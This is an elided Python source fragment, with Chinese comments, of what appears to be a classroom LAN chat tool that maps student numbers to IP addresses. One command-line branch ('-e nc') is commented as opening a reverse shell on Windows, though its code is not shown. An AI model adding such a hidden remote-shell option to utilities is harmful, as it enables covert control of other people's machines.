...
def creat_send_object():
    ...
    # 获取命令内容
    if args.msg:
        send_list.append(pkg_sendlist('-msg', args.msg)) # 传入 -msg 后 的内容 用于发送消息
...
def run_from_cmd():
    try:
        ...
        if args.e != 'nc': # 如果参数不为!nc，则执行send函数，用于
            ...
            send(send_list) 
            sys.exit(0)
        num = random.randint(1, 65535) # 当参数为-e nc时执行的内容。作用：反弹shell。适用平台：Windows
        ...
        print("[-] %s " % e)
        input("检测到程序似乎发生了一些很神奇的问题,请回报给2409(duck),然后按回车键退出")
...
def chat_whoami(): 
    ...
    # ip_last_digit = 64 # for debug to customizer your ip.
...
def chat_StuID2IP(StuID:int): # 给出学生号数，求出ip最后一段
    ...
    return ip_last_digit
    
def chat_IP2StuID(ip_last_digit:int): # 给出IP最后一段，求出号数
